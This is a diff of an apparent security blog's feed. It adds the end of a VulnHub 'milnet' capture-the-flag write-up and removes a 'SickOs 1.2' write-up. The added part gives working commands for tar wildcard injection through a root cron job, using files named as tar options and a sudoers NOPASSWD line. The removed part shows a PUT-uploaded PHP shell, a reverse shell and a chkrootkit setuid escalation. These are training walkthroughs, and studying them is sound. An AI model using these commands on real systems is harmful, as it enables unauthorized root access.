+<p>===[ 5. Conclusion</p>
+
+<p>Techniques discussed in article can be applied in different forms on various popular
+Unix tools. In real-world attacks, arbitrary shell options/arguments could be hidden
+among regular files, and not so easily spotted by administrator. Moreover, in case of
+cron jobs, shell scripts or web applications that calls shell commands, that&rsquo;s not
+even important. Moreover, there are probably much more popular Unix tools susceptible
+to previously described wildcard attacks.
+Thanks to Hrvoje Spoljar and Sec-Consult for a few ideas regarding this document.
+```</p>
+
+<p>This entertaining and useful read will probably come in handy next! I looked around some more, and saw a backup folder inside the / directory:</p>
+
+<p>```
+$ ls
+backup.sh
+backup.tgz
+$ cat backup.sh</p>
+
+<h1>!/bin/bash</h1>
+
+<p>cd /var/www/html
+tar cf /backup/backup.tgz *
+```</p>
+
+<p>This backup script creates an archive of all files inside /var/www/html. And it&rsquo;s owned by root. After reading that section about tar command execution, this is a big sign of the next steps to take in achieving root. So I needed to find out if this backup shell script is being used by anything. I grepped for a mention of the script in the files present on the filesystem:</p>
+
+<p><code>
+grep -r "backup.sh" 2&gt;/dev/null
+</code></p>
+
+<p>And an interesting entry popped up:</p>
+
+<p><code>
+etc/crontab:*/1 *   * * *   root    /backup/backup.sh
+</code></p>
+
+<p>The backup script is run every minute by cron. Now review the tar command execution section before proceeding. To run arbitrary code, we have to create 3 files inside the directory where tar is run, which in this case is /var/www/html.</p>
+
+<p>Now, remember the checkpoint parameters:</p>
+
+<p>```
+&mdash;checkpoint[=NUMBER]</p>
+
+<pre><code>display progress messages every NUMBERth record (default 10)
+</code></pre>
+
+<p>&mdash;checkpoint-action=ACTION</p>
+
+<pre><code>execute ACTION on each checkpoint
+</code></pre>
+
+<p>```</p>
+
+<p>We can use these to inject arbitrary commands. In other words, run the desired command when the checkpoint is reached. To test it out, I created the files as follows:</p>
+
+<p><code>
+echo "" &gt; --checkpoint=1
+echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
+echo "/usr/bin/whoami &gt; /tmp/readme" &gt; shell.sh
+chmod +x shell.sh
+</code></p>
+
+<p>And now when tar is run, it will pick up the files I created as parameters:</p>
+
+<p><code>
+$ ls
+--checkpoint-action=exec=sh shell.sh
+--checkpoint=1
+bomb.jpg
+bomb.php
+content.php
+index.php
+info.php
+main.php
+mj.jpg
+nav.php
+props.php
+shell.sh
+</code></p>
+
+<p>I waited for a bit and then:</p>
+
+<p><code>
+$ ls /tmp
+readme
+systemd-private-b21f86620e1c4dbf8ba8443074d9367f-systemd-timesyncd.service-flEglg
+vmware-root
+$ cat /tmp/readme
+root
+</code></p>
+
+<p>Awesome! It works! And this is a technique I had no idea about! So now I&rsquo;ve changed the commands to give my low-privilege user full permissions:</p>
+
+<p><code>
+$ echo 'echo "www-data  ALL=(ALL) NOPASSWD:ALL" &gt;&gt; /etc/sudoers' &gt; shell.sh
+$ cat shell.sh
+echo "www-data  ALL=(ALL) NOPASSWD:ALL" &gt;&gt; /etc/sudoers
+</code></p>
+
+<p>Again, after some waiting, the root powers are here!</p>
+
+<p>```
+$ sudo su
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/credits.txt</p>
+
+<pre><code>    ,----,                                                               
+  ,/   .`|                                                               
+,`   .'  :  ,---,                          ,---,.                        
+</code></pre>
+
+<p>  ;    ;     /,&mdash;.&lsquo; |                        ,&rsquo;  .&lsquo; |                  ,&mdash;&ndash;,
+.&rsquo;<strong>_,/    ,&lsquo; |  |  :                      ,&mdash;&ndash;.&rsquo;   |      ,&mdash;&ndash;,     ,&mdash;&ndash;.&lsquo;|
+|    :     |  :  :  :                      |   |   .&rsquo;  ,&ndash;+&ndash;. /  |    |   | :
+;    |.&lsquo;;  ;  :  |  |,&mdash;.   ,&mdash;&ndash;.          :   :  |&ndash;, ,&mdash;.&rsquo;|&lsquo;   |    |   | |
+`&mdash;&mdash;&rsquo;  |  |  |  :  &lsquo;   |  /     \         :   |  ;/||   |  ,&ldquo;&rsquo; |  ,&mdash;.</strong>| |</p>
+
+<pre><code>'   :  ;  |  |   /' : /    /  |        |   :   .'|   | /  | | /   ,'   | 
+|   |  '  '  :  | | |.    ' / |        |   |  |-,|   | |  | |.   '  /  | 
+'   :  |  |  |  ' | :'   ;   /|        '   :  ;/||   | |  |/ '   ; |:  | 
+;   |.'   |  :  :_:,''   |  / |        |   |    \|   | |--'  |   | '/  ' 
+'---'     |  | ,'    |   :    |        |   :   .'|   |/      |   :    :| 
+          `--''       \   \  /         |   | ,'  '---'        \   \  /   
+                       `----'          `----'                  `----'    
+</code></pre>
+
+<p>This was milnet for #vulnhub by @teh_warriar
+I hope you enjoyed this vm!</p>
+
+<p>If you liked it drop me a line on twitter or in #vulnhub.</p>
+
+<p>I hope you found the clue:
+/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
+I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for a long time&hellip;</p>
+
+<p>This VM was inspired by The Cuckoo&rsquo;s Egg.
+If you have not read it give it a try:
+<a href="http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/">http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/</a>
+```</p>
+
+<p>Great challenge, dropping some old-school knowledge about getting command injection by exploiting Unix wildcards!</p>
+
+<p>```</p>
+
+<hr />
+
+<p>/ Increased knowledge will help you now. \
+\ Have mate&rsquo;s phone bugged.              /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Dropping Droopy]]></title>
@@ -124,7 +916,7 @@ msf exploit(drupal_drupageddon) > info</p>
 
 <p>Provided by:
   SektionEins
-  Christian Mehlmauer <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#58;&#x46;&#105;&#x72;&#101;&#x46;&#97;&#x72;&#116;&#x40;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">&#70;&#105;&#114;&#101;&#70;&#97;&#x72;&#x74;&#x40;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a>
+  Christian Mehlmauer <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#58;&#70;&#105;&#x72;&#x65;&#70;&#x61;&#114;&#116;&#x40;&#x67;&#x6d;&#x61;&#105;&#x6c;&#46;&#99;&#x6f;&#109;">&#x46;&#x69;&#114;&#x65;&#x46;&#97;&#114;&#116;&#x40;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a>
   Brandon Perry</p>
 
 <p>Available targets:
@@ -278,11 +1070,11 @@ sh: 0: can&rsquo;t access tty; job control turned off</p>
 
 <h1>cat www-data</h1>
 
-<p>From Dave <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x64;&#97;&#118;&#101;&#x40;&#x64;&#114;&#111;&#x6f;&#112;&#121;&#46;&#x65;&#120;&#x61;&#x6d;&#112;&#108;&#x65;&#46;&#x63;&#111;&#x6d;">&#100;&#x61;&#118;&#x65;&#64;&#100;&#114;&#111;&#x6f;&#112;&#121;&#x2e;&#101;&#x78;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#x6d;</a> Wed Thu 14 Apr 04:34:39 2016
+<p>From Dave <a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#100;&#x61;&#x76;&#101;&#64;&#x64;&#x72;&#x6f;&#111;&#112;&#121;&#46;&#101;&#120;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;">&#100;&#x61;&#x76;&#101;&#x40;&#x64;&#114;&#111;&#x6f;&#x70;&#121;&#x2e;&#x65;&#x78;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#x63;&#x6f;&#x6d;</a> Wed Thu 14 Apr 04:34:39 2016
 Date: 14 Apr 2016 04:34:39 +0100
-From: Dave <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#100;&#x61;&#x76;&#x65;&#64;&#100;&#x72;&#111;&#111;&#112;&#x79;&#46;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#99;&#111;&#109;">&#x64;&#x61;&#x76;&#x65;&#x40;&#100;&#114;&#x6f;&#111;&#x70;&#121;&#x2e;&#x65;&#120;&#97;&#x6d;&#112;&#108;&#101;&#46;&#99;&#x6f;&#x6d;</a>
+From: Dave <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x64;&#x61;&#118;&#101;&#x40;&#x64;&#x72;&#x6f;&#111;&#112;&#121;&#46;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#46;&#99;&#x6f;&#x6d;">&#x64;&#x61;&#x76;&#x65;&#64;&#x64;&#114;&#x6f;&#111;&#x70;&#x79;&#x2e;&#101;&#120;&#97;&#109;&#112;&#x6c;&#101;&#46;&#99;&#111;&#109;</a>
 Subject: rockyou with a nice hat!
-Message-ID: <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#55;&#51;&#48;&#x32;&#x36;&#x32;&#x35;&#x36;&#56;&#x40;&#101;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#46;&#99;&#x6f;&#109;">&#55;&#x33;&#48;&#x32;&#x36;&#x32;&#x35;&#x36;&#56;&#64;&#x65;&#120;&#x61;&#109;&#112;&#108;&#x65;&#x2e;&#x63;&#x6f;&#109;</a>
+Message-ID: <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#55;&#x33;&#48;&#50;&#54;&#50;&#x35;&#54;&#x38;&#x40;&#x65;&#120;&#97;&#109;&#x70;&#x6c;&#101;&#x2e;&#99;&#111;&#109;">&#55;&#51;&#48;&#50;&#54;&#x32;&#53;&#x36;&#56;&#x40;&#101;&#x78;&#x61;&#109;&#112;&#108;&#x65;&#46;&#x63;&#111;&#109;</a>
 X-IMAP: 0080081351 0000002016
 Status: NN</p>
 
@@ -361,7 +1153,7 @@ SERPENT, TWOFISH.
 truecrack
 TrueCrack v3.0
 Website: <a href="http://code.google.com/p/truecrack">http://code.google.com/p/truecrack</a>
-Contact us: <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x69;&#110;&#102;&#x6f;&#x74;&#114;&#x75;&#101;&#x63;&#114;&#97;&#x63;&#107;&#x40;&#x67;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;">&#x69;&#x6e;&#102;&#111;&#116;&#114;&#x75;&#101;&#x63;&#x72;&#97;&#x63;&#107;&#64;&#103;&#109;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;</a>
+Contact us: <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#105;&#110;&#102;&#111;&#x74;&#114;&#x75;&#x65;&#x63;&#x72;&#97;&#99;&#x6b;&#64;&#x67;&#109;&#97;&#x69;&#108;&#x2e;&#99;&#111;&#109;">&#105;&#110;&#x66;&#111;&#x74;&#x72;&#117;&#x65;&#x63;&#114;&#97;&#x63;&#x6b;&#64;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;</a>
 Bruteforce password cracker for Truecrypt volume. Optimazed with Nvidia Cuda technology.
 Based on TrueCrypt, freely available at <a href="http://www.truecrypt.org/">http://www.truecrypt.org/</a>
 Copyright &copy; 2011 by Luca Vaccaro.</p>
@@ -770,7 +1562,7 @@ Archive:  backup.tar.bz2.zip
 fcrackzip &mdash;help</p>
 
 <p>fcrackzip version 1.0, a fast/free zip password cracker
-written by Marc Lehmann <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#112;&#x63;&#103;&#64;&#x67;&#111;&#111;&#102;&#46;&#99;&#x6f;&#109;">&#x70;&#x63;&#103;&#x40;&#103;&#x6f;&#x6f;&#102;&#x2e;&#x63;&#111;&#x6d;</a> You can find more info on
+written by Marc Lehmann <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x70;&#x63;&#103;&#64;&#x67;&#x6f;&#x6f;&#x66;&#46;&#99;&#x6f;&#109;">&#112;&#x63;&#x67;&#64;&#x67;&#x6f;&#111;&#102;&#x2e;&#x63;&#111;&#109;</a> You can find more info on
 <a href="http://www.goof.com/pcg/marc/">http://www.goof.com/pcg/marc/</a></p>
 
 <p>USAGE: fcrackzip</p>
@@ -2380,202 +3172,6 @@ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</p>
 | master stays out                        |
 |                                         |
 \ of the way.                             /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[SickOs 1.2 writeup]]></title>
-    <link href="http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup/"/>
-    <updated>2017-07-03T04:20:13-04:00</updated>
-    <id>http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup</id>
-    <content type="html"><![CDATA[<p>Today&rsquo;s VM is the second machine in the SickOs series. The goal is to obtain the root flag. Target acquired!</p>
-
-<!-- more -->
-
-
-<p></p>
-
-<p>I did a fast scan with Masscan and discovered that ports 22 and 80 are open. Then I scanned them with Nmap:</p>
-
-<p>```
-nmap -T4 -p22,80 -sV 192.168.217.146</p>
-
-<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-03 09:11 EDT
-Nmap scan report for 192.168.217.146
-Host is up (0.00030s latency).
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    lighttpd 1.4.28
-```</p>
-
-<p>The web server serves this pic:</p>
-
-<p><img class="center" src="/images/pentest/sickos/2-blow.jpg" title="&lsquo;web server&rsquo; &lsquo;webpage&rsquo;" ></p>
-
-<p>Nothing in exiftool. I bruteforced the web server, but the only discovery was an empty test directory. I initially overlooked the page source of the picture, until I noticed there is a scroll bar. So I scrolled down to find a comment:</p>
-
-<p>```</p>
-
-<!-- NOTHING IN HERE ///\\\ -->
-
-
-<blockquote><blockquote><blockquote><p>```</p></blockquote></blockquote></blockquote>
-
-<p>I tried constructing a path out of the comment, but didn&rsquo;t get anywhere. Searching for an exploit for the lighttpd server version didn&rsquo;t yield anything either, although I found some for other versions.</p>
-
-<p>Back to the empty directory, I found it strange that there would be an innocuous empty folder on the web server, and I thought it might hint to making it..not empty by uploading something there :&ndash;) I was at a loss on how to do that with no attack vectors, but then I remembered that uploading something on a server doesn&rsquo;t always require sophisticated mechanisms and PHP vulnerabilities and the like. It&rsquo;s just as simple as using a certain HTTP method that you don&rsquo;t see too often: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT">PUT</a></p>
-
-<p>First, I needed to verify if PUT is allowed in the first place:</p>
-
-<p><code>
-nmap --script http-methods --script-args http-methods.url-path='/test' 192.168.217.146
-PORT   STATE SERVICE
-80/tcp open  http
-| http-methods:
-|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET HEAD POST OPTIONS
-|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
-|_  Path tested: /test
-</code></p>
-
-<p>Excellent! I proceeded to upload a PHP shell with curl,but I got some weird expectation failed errors. Luckily, Nmap also has a script for PUT'ing things on a server:</p>
-
-<p>```
-nmap -p 80 192.168.217.146 &mdash;script http-put &mdash;script-args http-put.url=&lsquo;/test/shell.php&rsquo;,http-put.file=&lsquo;/root/Desktop/shell.php&rsquo;</p>
-
-<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-04 04:36 EDT
-Nmap scan report for 192.168.217.146
-Host is up (0.00031s latency).
-PORT   STATE SERVICE
-80/tcp open  http
-|_http-put: /test/shell.php was successfully created
-```</p>
-
-<p>All didn&rsquo;t work well, though. I usually use 8888 for my reverse shells, but this time I got nothing. I tried port 80, and still no joy. It seems that only port 443 is allowed. I looked at other walkthroughs for this, so I&rsquo;m not sure how you could determine it otherwise besides trial and error. But when I changed to the correct port, I got the shell:</p>
-
-<p><code>
-nc -vnlp 443
-listening on [any] 443 ...
-connect to [192.168.217.132] from (UNKNOWN) [192.168.217.146] 49769
-Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
- 01:48:24 up  1:38,  0 users,  load average: 0.00, 0.01, 0.05
-USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ whoami
-www-data
-</code></p>
-
-<p>Next, I did some enumeration. The usual culprits didn&rsquo;t stand out, and the permissions on this shell were pretty limited, but I did find something interesting pertaining to cron:</p>
-
-<p>```
-$ ls -al /etc/cron*
--rw-r&mdash;r&mdash; 1 root root  722 Jun 19  2012 /etc/crontab</p>
-
-<p>ls: cannot open directory /etc/cron.d: Permission denied
-/etc/cron.daily:
-total 72
-drwxr-xr-x  2 root root  4096 Apr 12  2016 .
-drwxr-xr-x 84 root root  4096 Jul  4 00:10 ..
--rw-r&mdash;r&mdash;  1 root root   102 Jun 19  2012 .placeholder
--rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
--rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
--rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
--rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
--rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
--rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
--rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
--rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
--rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
--rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
--rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
--rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
-```</p>
-
-<p>The entry that got my attention was the chkrootkit one. chkrootkit is a tool that checks for rootkits on the system. I googled for possible exploits, and I did find <a href="https://www.exploit-db.com/exploits/33899/">one</a> right away. The vulnerable version is 0.49. I checked which version is installed on the system:</p>
-
-<p><code>
-$ chkrootkit -V
-chkrootkit version 0.49
-</code></p>
-
-<p>Well, well! The exploit leverages exactly the case here, vulnerable chkrootkit running as root, courtesy of the cron job. The step to compromise the system is to put an executable file named &lsquo;update&rsquo; with non-root owner in /tmp</p>
-
-<p>So, my idea was to give myself privileges to run an existing shell as root. I looked at what shells are installed on the system:</p>
-
-<p>```
-$ cat /etc/shells</p>
-
-<h1>/etc/shells: valid login shells</h1>
-
-<p>/bin/sh
-/bin/dash
-/bin/bash
-/bin/rbash
-$ ls -l /bin/*sh
--rwxr-xr-x 1 root root 920788 Mar 28  2013 /bin/bash
--rwxr-xr-x 1 root root 100284 Mar 29  2012 /bin/dash
-lrwxrwxrwx 1 root root      4 Mar 28  2013 /bin/rbash &ndash;> bash
-lrwxrwxrwx 1 root root      4 Mar 29  2012 /bin/sh &ndash;> dash
-lrwxrwxrwx 1 root root      7 Nov 16  2012 /bin/static-sh &ndash;> busybox
-```</p>
-
-<p>I wasted almost an hour next, because the non-interactive shell gave me grief and prevented things from working properly. I started with bash and made it suid and ran it, but it didn&rsquo;t work. What worked was making dash suid and also spawning a TTY shell with <code>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;</code>.</p>
-
-<p>Inside the update file, I just made <em>/bin/dash</em> suid:</p>
-
-<p>```
-$ cat update</p>
-
-<h1>!/bin/bash</h1>
-
-<p>chmod u+s /bin/dash
-```</p>
-
-<p>Then I waited a minute for cron to run and got root:</p>
-
-<p>```
-$ /bin/dash
-/bin/dash</p>
-
-<h1>whoami</h1>
-
-<p>whoami
-root
-```</p>
-
-<p>Besides the flag, in the root directory there was rule file for iptables that explained the VM&rsquo;s behavior. Anyway, here&rsquo;s the flag:</p>
-
-<p>```</p>
-
-<h1>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</h1>
-
-<p>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
-WoW! If you are viewing this, You have &ldquo;Sucessfully!!&rdquo; completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.</p>
-
-<p>Thanks for giving this try.</p>
-
-<p>@vulnhub: Thanks for hosting this UP!.
-```</p>
-
-<p>This machine was challenging in the way it limited you to only certain actions. Damn, the first thing I will do from now on when getting a limited shell is spawn a TTY!!!</p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ Tomorrow will be cancelled due to lack \
-\ of interest.                           /</p>
 
 <hr />
 
